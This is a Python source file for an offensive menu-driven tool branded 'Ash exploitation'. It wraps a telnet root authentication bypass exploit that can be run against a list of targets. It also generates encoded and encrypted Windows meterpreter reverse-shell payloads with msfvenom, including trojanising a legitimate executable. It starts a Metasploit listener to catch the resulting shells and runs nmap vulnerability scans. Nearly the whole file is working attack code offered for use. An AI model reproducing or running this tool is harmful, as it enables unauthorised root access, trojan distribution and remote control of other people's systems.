import getpass
import os
import subprocess

from pymenu import Menu
from pymetasploit3.msfrpc import MsfRpcClient


def CVE20262461():
    selector = input('[+] Single or multiple: ')
    if selector == 'single':
        target = input("[+] Telnet IP Address: ")
        subprocess.run([f'''USER='-f root' telnet -a {target}'''], shell=True)
    elif selector == 'multiple':
        target = open('targets.txt', 'r')
        targets = target.readlines()
        for line in targets:
            subprocess.run([f'''USER='-f root' telnet -a {line}'''], shell=True)
            print('\n')


def windowspayload():
    IP = input("[+] Listener IP Address: ")
    PORT = input("[+] Listener Port: ")
    print('[+] Creating payload...\n')
    subprocess.run(
        f'''msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -o payload.exe --encrypt aes256 LHOST={IP} LPORT={PORT}''',
        shell=True)
    if os.path.exists("payload.exe"):
        print('[+] Payload successfully created!\n')
    else:
        print(
            '[+] Payload could not be created!\n')  # Boilerplate for when msfrpc devs can update their wrapper.  # msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')  # print('\n[+] Starting MSFRPCD server...')  # subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)  # print('\n[+] MSFRPCD server started successfully!\n')  # IP = input("[+] Payload IP address: ")  # port = input("[+] Payload port: ")  # print('\n[+] Creating windows payload...')  # client = MsfRpcClient(msfpass, port=55552, ssl=True)  # payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')  # payload['Encoder'] = 'x86/shikata_ga_nai'  # payload['iterations'] = '10'  # payload.runoptions['LHOST'] = IP  # payload.runoptions['LPORT'] = port  # payload['arch'] = 'x86'  # payload['platform'] = 'windows'  # payload['encryption'] = 'aes256'  # payload['Format'] = 'exe'  # data = payload.payload_generate()  # if isinstance(data, str):  #     print(data)  # else:  #     with open('payload.exe', 'wb') as f:  #         f.write(data)  # print('\n[+] Payload created successfully!')


def windowspayloadbind():
    IP = input("[+] Listener IP Address: ")
    PORT = input("[+] Listener Port: ")
    pathtoexe = input("[+] Path to Exe: ")
    print('[+] Creating payload...\n')
    subprocess.run(
        f'''msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -o payload.exe --encrypt aes256 LHOST={IP} LPORT={PORT} -x {pathtoexe} -k''',
        shell=True)
    if os.path.exists("payload.exe"):
        print('[+] Payload successfully created!\n')
    else:
        print('[+] Payload could not be created!\n')


def windowslistener():
    IP = input("[+] Payload IP Address: ")
    PORT = input("[+] Payload Port: ")
    msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')
    print('\n[+] Starting MSFRPCD server...')
    subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)
    print('\n[+] MSFRPCD server started successfully!')
    print('[+] Starting multi/handler...')
    client = MsfRpcClient(msfpass, port=55552)
    exploit = client.modules.use('exploit', 'multi/handler')
    winpayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    winpayload['LHOST'] = IP
    winpayload['LPORT'] = PORT
    exploit.execute(payload=winpayload)

def vulnscanmodule():
    target = input('[+] Target URL/IP Address: ')
    subprocess.run(f'''nmap --script vuln {target}''', shell=True)
    print('\n[+] Happy hunting ;)')

menu = Menu('''

    _    ____  _   _ 
   / \  / ___|| | | |
  / _ \ \___ \| |_| |
 / ___ \ ___) |  _  |
/_/   \_\____/|_| |_|

\nAsh exploitation, at your service''')
menu.add_option('[+] Exploit CVE-2026-2461 telnet root auth bypass', lambda: CVE20262461())
menu.add_option('[+] Create windows payload (MSFVenom)', lambda: windowspayload())
menu.add_option('[+] Bind windows payload (MSFVenom)', lambda: windowspayloadbind())
menu.add_option('[+] Listen for windows payload (MSFConsole)', lambda: windowslistener())
menu.add_option('[+] CVE scanner (NMAP)', lambda: vulnscanmodule())
menu.show()
